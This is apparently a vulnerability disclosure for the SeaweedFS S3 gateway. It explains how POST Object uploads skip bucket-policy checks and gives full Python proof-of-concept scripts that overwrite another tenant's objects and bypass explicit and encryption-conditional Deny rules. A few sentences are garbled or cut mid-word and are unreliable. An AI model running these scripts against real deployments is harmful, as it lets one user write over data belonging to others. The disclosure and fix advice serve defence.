repo.description:
Summary

The SeaweedFS S3 gateway does not evaluate bucket policies on the POST Object upload path (PostPolicyBucketHandler - POST /{bucket} with Content-Type: multipart/form-data; the HTML-form / presigned-POST upload).

Authorization for POST Object is performed only with the coarse per-identity action check (identity.CanDo(ACTION_WRITE, bucket, "")) plus verification of the caller's POST-policy signature. The bucket-policy engine that runs for every other S3 request (authRequestWithAuthType → EvaluatePolicy / VerifyActionPermission) is never invoked.

Consequently, when a bucket policy is used to restrict an authenticated S3 identity - the standard S3 mechanism for isolating multiple tenants that share a bucket, confining an identity to a key prefix, requiring encryption, or restricting by source IP - that restriction is silently ineffective for POST Object uploads. An identity that is denied s3:PutObject on a key can still create or overwrite that key by sending the upload as a POST instead of a PUT.

Trust boundary crossed

One S3 identity writes and overwrites another S3 identity's data - the second in-scope example in SECURITY.md ("One S3 identity reading, writing, or deleting another identity's data").

Two S3 identities (tenant-a, tenant-b) share the bucket shared. A bucket policy confines each to its own prefix (shared/a/*, shared/b/*). tenant-a uses POST Object to overwrite shared/b/report.txt, an object owned by tenant-b, which tenant-a is explicitly denied from writing.

Affected version

master, version string 4.45 (weed/util/version/constants.go: MAJOR_VERSION=4, MINOR_VERSION=45); source archive of master retrieved 2026-09-01. The code path is long-standing; reproduce on current master.

Deployment and configuration

  • A single weed server -s3 -filer process (master + volume + filer + S3 in one; the same result holds for split deployments).
  • S3 authentication enabled via -s3.config (identities file).
  • Only the S3 API port (default 8333) is reachable by the attacker. No access to master/volume/filer ports is needed.
  • The bucket owner has attached a bucket policy (via `PUT /{bucket}?police identities.

Attacker starting position

A valid S3 user holding ordinary credentials and the coarse Write action for the shared bucket in the identities file ("Write:shared") - the grant every identity thatares the bucket must have for its S3 operations to route. The bucket poeep that identity inside its own prefix.

Expected vs. actual

  • Expected: a POST Object upload is authorized identically to the equivalent PUT - an explicit bucket-policy Deny blocks it.
  • Actual: the PUT is denied (403 AccessDenied); the POST succeeds (ten / overwritten.

Root cause

weed/s3api/auth_credentials.go - AuthPostPolicy()

A POST Object request carries its credentials in the multipart form body, so getRequestAuthType(r) classifies the request as authTypeAnonymous. The request is treated as anonymous and denied with ErrAccessDenied, which triggers this branch:

identity, errCode, authType := iam.authRequestWithAuthType(r, action)
if errCode == s3err.ErrAccessDenied {
    if authType == authTypeAnonymous &&
        r.Method == http.MethodPost &&
        strings.Contains(r.Header.Get("Content-Type"), "multipart/form-data") {
        f(w, r)          // delegate straight to the handler
        return
    }
}

The request reaches PostPolicyBucketHandler without the bucket policy ever having been evaluated against the real caller.

weed/s3api/s3api_object_handlers_postpolicy.go - PostPolicyBucketHandler()

The handler then authorizes solely via:

  • doesPolicySignatureMatch(formValues) - verifies the POST-policy signatuCTION_WRITE, bucket, "") (coarse identity actions only)
  • policy.CheckPostPolicy(formValues, postPolicyForm) - checks the form fields against the client-supplied, client-signed POST policy document

It never calls authRequestWithAuthType, iam.policyEngine.EvaluatePolicy, or iam.VerifyActionPermission. It then writes via s3a.putToFiler directly, bypassing PutObjectHandler.

This gap is isolated to POST Object. Every other write path where the target key is not named by the request URL already performs a full per-resource bucket-policy check. I verified each:

Path | Per-resource authorization | Bucket policy evaluated? -- | -- | -- PUT PutObject | iam.Auth → authRequestWithAuthType | yes PUT CopyObject | source via iam.AuthorizeCopySource | yes PUT ?renameObject | AuthorizeCopySource + AuthorizeObjectDelete | yes POST ?delete (DeleteObjects) | iam.AuthorizeObjectDelete per key | yes Multipart (?uploads / ?partNumber / ?uploadId) | iam.Auth; policy engine maps multipart actions onto s3:PutObject (policy_engine/engine.go:168) | yes - tested: Deny s3:PutObject blocks the whole flow POST /{bucket} form upload (PostPolicy) | identity.CanDo(WRITE, bucket) + POST-policy signature only | no

PoC

Built from master, S3 auth enabled. s3.json identities: owner (Admin), tenant-a / tenant-b (Read/Write/List:shared), writer (Read/Write/List:testbucket).

weed server -dir=./data -s3 -s3.config=./s3.json -filer -ip=127.0.0.1 -volume.max=100
python3 -m venv venv && ./venv/bin/pip install boto3 requests
./venv/bin/python poc_cross_tenant_overwrite.py         # cross-tenant overwrite
./venv/bin/python poc_postpolicy_bucketpolicy_bypass.py # explicit Deny bypass
./venv/bin/python poc_conditional_deny_bypass.py        # conditional Deny bypass
./venv/bin/python verify_multipart_NOT_affected.py      # control: multipart is fine

Primary - cross-tenant overwrite. owner creates bucket shared and attaches:

{ "Version": "2012-10-17",
  "Statement": [
    { "Sid": "ConfineA", "Effect": "Deny",
      "Principal": { "AWS": "arn:aws:iam::000000000000:user/tenant-a" },
      "Action": "s3:PutObject", "NotResource": "arn:aws:s3:::shared/a/*" },
    { "Sid": "ConfineB", "Effect": "Deny",
      "Principal": { "AWS": "arn:aws:iam::000000000000:user/tenant-b" },
      "Action": "s3:PutObject", "NotResource": "arn:aws:s3:::shared/b/*" } ] }

Observed:

[*] tenant-b stored shared/b/report.txt = b'TENANT-B-CONFIDENTIAL'
[*] tenant-a PUT  shared/b/report.txt -> DENIED (AccessDenied)
[*] tenant-a POST shared/b/report.txt -> HTTP 204
[*] shared/b/report.txt now = b'OVERWRITTEN-BY-TENANT-A'
[VULNERABLE] tenant-a overwrote tenant-b's object despite the bucket policy that denies it

Secondary variants:

  • poc_postpolicy_bucketpolicy_bypass.py - plain explicit Deny s3:PutObject on bucket/denied/*: PUT → 403, POST → 204.
  • poc_conditional_deny_bypass.py - Deny s3:PutObject unless s3:x-amz-server-side-encryption = AES256: PUT without the header → 403, POST without it → 204 (object stored unencrypted).

The coarse identity check is still enforced (a POST to a bucket for which the caller holds no Write action returns 403), so this is specifically a bucket-policy bypass, not a total authorization bypass.

Impact

  • Class: incorrect authorization / access-control bypass (CWE-863) on the S3 API.
  • One authenticated S3 identity can create and overwrite objects that a bucket policy is configured to forbid it - including objects owned by another identity that shares the bucket.
  • Any bucket-policy control expressed for authenticated principals (prefix confinement, explicit per-key Deny, aws:SourceIp allow-list, encryption-required, ACL constraints, s3:prefix) does not apply to POST Object uploads.
  • Prerequisite: S3 auth enabled and bucket policies in use; attacker is an existing S3 user with the coarse Write action on the target bucket.

Suggested fix

After PostPolicyBucketHandler authenticates the caller via the POST-policy signature, run the same authorization the PUT path uses before writing - iam.VerifyActionPermission(r, identity, ACTION_WRITE, bucket, object) and iam.policyEngine.EvaluatePolicy(bucket, object, "s3:PutObject", principal, …), honouring an explicit Deny. Equivalently, have AuthPostPolicy re-run the authorization stage against the identity resolved from the form signature instead of delegating unconditionally.

### PoC - full scripts `s3.json` (identities file): ```json { "identities": [ { "name": "owner", "credentials": [{ "accessKey": "ownerkey", "secretKey": "ownersecret" }], "actions": ["Admin", "Read", "Write", "List", "Tagging"] }, { "name": "writer", "credentials": [{ "accessKey": "writerkey", "secretKey": "writersecret" }], "actions": ["Read:testbucket", "Write:testbucket", "List:testbucket"] }, { "name": "tenant-a", "credentials": [{ "accessKey": "akeya", "secretKey": "skeya" }], "actions": ["Read:shared", "Write:shared", "List:shared"] }, { "name": "tenant-b", "credentials": [{ "accessKey": "akeyb", "secretKey": "skeyb" }], "actions": ["Read:shared", "Write:shared", "List:shared"] } ] } ``` Run: `weed server -dir=./data -s3 -s3.config=./s3.json -filer -ip=127.0.0.1 -volume.max=100` **`poc_cross_tenant_overwrite.py`** (primary - cross-tenant overwrite): ```python """ Multi-tenant PoC: two S3 identities share one bucket; a bucket policy confines each to its own prefix. tenant-a bypasses the policy via POST Object and overwrites tenant-b's object -> one S3 identity writing another identity's data. """ import boto3, requests, json, sys from botocore.config import Config EP="http://127.0.0.1:8333" def c(a,s): return boto3.client("s3",endpoint_url=EP,aws_access_key_id=a,aws_secret_access_key=s,region_name="us-east-1",config=Config(signature_version="s3v4",s3={"addressing_style":"path"})) owner=c("ownerkey","ownersecret"); ta=c("akeya","skeya"); tb=c("akeyb","skeyb") B="shared" owner.create_bucket(Bucket=B) # Bucket policy: tenant-a may only write under a/ ; tenant-b only under b/ policy={"Version":"2012-10-17","Statement":[ {"Sid":"ConfineA","Effect":"Deny","Principal":{"AWS":"arn:aws:iam::000000000000:user/tenant-a"}, "Action":"s3:PutObject","NotResource":"arn:aws:s3:::shared/a/*"}, {"Sid":"ConfineB","Effect":"Deny","Principal":{"AWS":"arn:aws:iam::000000000000:user/tenant-b"}, "Action":"s3:PutObject","NotResource":"arn:aws:s3:::shared/b/*"}, ]} owner.put_bucket_policy(Bucket=B,Policy=json.dumps(policy)) print("[*] policy: tenant-a confined to shared/a/*, tenant-b confined to shared/b/*") # tenant-b writes its own private object tb.put_object(Bucket=B,Key="b/report.txt",Body=b"TENANT-B-CONFIDENTIAL") print("[*] tenant-b stored shared/b/report.txt =", owner.get_object(Bucket=B,Key="b/report.txt")["Body"].read()) # tenant-a: PUT into tenant-b's prefix -> must be denied try: ta.put_object(Bucket=B,Key="b/report.txt",Body=b"OWNED-BY-A") put_res="ALLOWED" except Exception as e: put_res="DENIED ("+e.response["Error"]["Code"]+")" print(f"[*] tenant-a PUT shared/b/report.txt -> {put_res}") # tenant-a: POST Object into tenant-b's prefix, same key p=ta.generate_presigned_post(Bucket=B,Key="b/report.txt",ExpiresIn=3600) r=requests.post(p["url"],data=p["fields"],files={"file":("x",b"OVERWRITTEN-BY-TENANT-A")}) print(f"[*] tenant-a POST shared/b/report.txt -> HTTP {r.status_code}") after=owner.get_object(Bucket=B,Key="b/report.txt")["Body"].read() print("[*] shared/b/report.txt now =", after) if put_res.startswith("DENIED") and after==b"OVERWRITTEN-BY-TENANT-A": print("\n[VULNERABLE] tenant-a overwrote tenant-b's object despite the bucket " "policy that denies it - cross-tenant write via POST Object.") sys.exit(0) print("\n[not reproduced]"); sys.exit(1) ``` **`poc_postpolicy_bucketpolicy_bypass.py`** (explicit Deny bypass): ```python #!/usr/bin/env python3 """ PoC: SeaweedFS S3 API - bucket policy (explicit Deny / Deny-with-Condition) bypass via the POST Object (browser-based / presigned-POST) upload path. The PostPolicyBucketHandler authorizes uploads only with the legacy identity action check (identity.CanDo(WRITE, bucket)). It never evaluates the bucket policy, so an explicit `Deny` statement -- the strongest control in S3 -- is silently ignored for POST uploads while being correctly enforced for PUT. Setup expected: weed server -s3 -s3.config=s3.json (identities: 'owner' = Admin, 'writer' = Write:testbucket) Usage: ./venv/bin/python poc_postpolicy_bucketpolicy_bypass.py Exit 0 => vulnerable. """ import json, sys, uuid import boto3, requests from botocore.config import Config EP = "http://127.0.0.1:8333" BUCKET = "testbucket" # 'writer' identity has Write/Read/List on this bucket WRITER_ARN = "arn:aws:iam::000000000000:user/writer" def client(ak, sk): return boto3.client("s3", endpoint_url=EP, aws_access_key_id=ak, aws_secret_access_key=sk, region_name="us-east-1", config=Config(signature_version="s3v4", s3={"addressing_style": "path"})) owner = client("ownerkey", "ownersecret") writer = client("writerkey", "writersecret") try: owner.create_bucket(Bucket=BUCKET) except Exception: pass # Bucket policy: explicitly DENY 'writer' s3:PutObject under the "denied/" prefix. policy = { "Version": "2012-10-17", "Statement": [{ "Sid": "DenyWriterPrefix", "Effect": "Deny", "Principal": {"AWS": WRITER_ARN}, "Action": ["s3:PutObject"], "Resource": [f"arn:aws:s3:::{BUCKET}/denied/*"], }], } owner.put_bucket_policy(Bucket=BUCKET, Policy=json.dumps(policy)) print(f"[*] Bucket policy set: explicit Deny writer -> s3:PutObject on {BUCKET}/denied/*") # 1) Baseline: PUT into denied/ must be rejected. put_key = "denied/" + uuid.uuid4().hex[:8] try: writer.put_object(Bucket=BUCKET, Key=put_key, Body=b"data") put_result = "ALLOWED" except Exception as e: put_result = "DENIED (" + e.response["Error"]["Code"] + ")" print(f"[*] writer PUT {BUCKET}/{put_key} -> {put_result}") # 2) Attack: same principal, same denied prefix, via POST Object. post_key = "denied/" + uuid.uuid4().hex[:8] p = writer.generate_presigned_post(Bucket=BUCKET, Key=post_key, ExpiresIn=3600) r = requests.post(p["url"], data=p["fields"], files={"file": ("x", b"BYPASSED-VIA-POST")}) print(f"[*] writer POST {BUCKET}/{post_key} -> HTTP {r.status_code}") created = False try: body = owner.get_object(Bucket=BUCKET, Key=post_key)["Body"].read() created = (body == b"BYPASSED-VIA-POST") except Exception: pass if put_result.startswith("DENIED") and created: print("\n[VULNERABLE] Bucket policy explicit Deny is enforced for PUT but " "bypassed by POST Object: writer wrote an object it is explicitly denied.") sys.exit(0) print("\n[not reproduced]") sys.exit(1) ``` **`poc_conditional_deny_bypass.py`** (conditional Deny bypass): ```python #!/usr/bin/env python3 """ Variant PoC: a CONDITIONAL bucket-policy Deny ("deny PutObject unless server-side encryption AES256") is enforced for PUT but bypassed by POST Object. Same setup as poc_postpolicy_bucketpolicy_bypass.py. Exit 0 => vulnerable. """ import json, sys, uuid import boto3, requests from botocore.config import Config EP = "http://127.0.0.1:8333" BUCKET = "testbucket" WRITER_ARN = "arn:aws:iam::000000000000:user/writer" def client(ak, sk): return boto3.client("s3", endpoint_url=EP, aws_access_key_id=ak, aws_secret_access_key=sk, region_name="us-east-1", config=Config(signature_version="s3v4", s3={"addressing_style": "path"})) owner = client("ownerkey", "ownersecret") writer = client("writerkey", "writersecret") try: owner.create_bucket(Bucket=BUCKET) except Exception: pass policy = { "Version": "2012-10-17", "Statement": [{ "Sid": "RequireEncryption", "Effect": "Deny", "Principal": {"AWS": WRITER_ARN}, "Action": "s3:PutObject", "Resource": f"arn:aws:s3:::{BUCKET}/cond/*", "Condition": {"StringNotEquals": {"s3:x-amz-server-side-encryption": "AES256"}}, }], } owner.put_bucket_policy(Bucket=BUCKET, Policy=json.dumps(policy)) print(f"[*] Policy: deny writer PutObject on {BUCKET}/cond/* unless SSE=AES256") k1 = "cond/" + uuid.uuid4().hex[:8] try: writer.put_object(Bucket=BUCKET, Key=k1, Body=b"x") # no encryption header put_res = "ALLOWED" except Exception as e: put_res = "DENIED (" + e.response["Error"]["Code"] + ")" print(f"[*] writer PUT (no SSE) {BUCKET}/{k1} -> {put_res}") k2 = "cond/" + uuid.uuid4().hex[:8] p = writer.generate_presigned_post(Bucket=BUCKET, Key=k2, ExpiresIn=3600) r = requests.post(p["url"], data=p["fields"], files={"file": ("x", b"x")}) # no SSE field print(f"[*] writer POST (no SSE) {BUCKET}/{k2} -> HTTP {r.status_code}") created = False try: owner.head_object(Bucket=BUCKET, Key=k2) created = True except Exception: pass if put_res.startswith("DENIED") and created: print("\n[VULNERABLE] conditional Deny enforced for PUT, bypassed by POST Object") sys.exit(0) print("\n[not reproduced]") sys.exit(1) ``` **`verify_multipart_NOT_affected.py`** (control - shows multipart is unaffected): ```python import boto3, json, uuid from botocore.config import Config EP="http://127.0.0.1:8333" def c(a,s): return boto3.client("s3",endpoint_url=EP,aws_access_key_id=a,aws_secret_access_key=s,region_name="us-east-1",config=Config(signature_version="s3v4",s3={"addressing_style":"path"})) o=c("ownerkey","ownersecret"); w=c("writerkey","writersecret") B="testbucket" try: o.create_bucket(Bucket=B) except Exception: pass def set_policy(actions): pol={"Version":"2012-10-17","Statement":[{ "Sid":"D","Effect":"Deny", "Principal":{"AWS":"arn:aws:iam::000000000000:user/writer"}, "Action":actions, "Resource":f"arn:aws:s3:::{B}/ro/*"}]} o.put_bucket_policy(Bucket=B,Policy=json.dumps(pol)) def mpu(cli,key,data=b"x"*(5*1024*1024)+b"y"): try: u=cli.create_multipart_upload(Bucket=B,Key=key) uid=u["UploadId"] p=cli.upload_part(Bucket=B,Key=key,PartNumber=1,UploadId=uid,Body=data) cli.complete_multipart_upload(Bucket=B,Key=key,UploadId=uid, MultipartUpload={"Parts":[{"ETag":p["ETag"],"PartNumber":1}]}) return "SUCCEEDED" except Exception as e: return "blocked:"+e.response["Error"]["Code"] def put(cli,key): try: cli.put_object(Bucket=B,Key=key,Body=b"x"); return "SUCCEEDED" except Exception as e: return "blocked:"+e.response["Error"]["Code"] print("=== Deny s3:PutObject on testbucket/ro/* ===") set_policy(["s3:PutObject"]) print("writer PUT ro/x :", put(w,"ro/"+uuid.uuid4().hex[:6])) print("writer MPU ro/x :", mpu(w,"ro/"+uuid.uuid4().hex[:6])) print("=== Deny s3:PutObject + s3:CreateMultipartUpload + s3:UploadPart ===") set_policy(["s3:PutObject","s3:CreateMultipartUpload","s3:UploadPart"]) print("writer MPU ro/x :", mpu(w,"ro/"+uuid.uuid4().hex[:6])) print("=== Deny s3:* ===") set_policy(["s3:*"]) print("writer MPU ro/x :", mpu(w,"ro/"+uuid.uuid4().hex[:6])) ```
repo.summary: S3 API: bucket policy not enforced on POST Object uploads - an S3 identity can overwrite another identity's data
